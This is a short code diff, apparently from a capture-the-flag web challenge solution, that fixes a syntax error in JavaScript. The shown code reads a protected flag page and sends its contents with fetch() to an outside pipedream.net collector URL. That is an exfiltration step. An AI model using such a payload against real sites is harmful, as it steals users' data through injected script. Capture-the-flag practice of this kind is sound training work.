@@ -8,6 +8,6 @@ fetch("https://hallmark.web.actf.co/flag").then(function(a) {
       }
 
       fetch("https://eolimcwppmmjo1s.m.pipedream.net", options)
-        )
+        
     })
 })
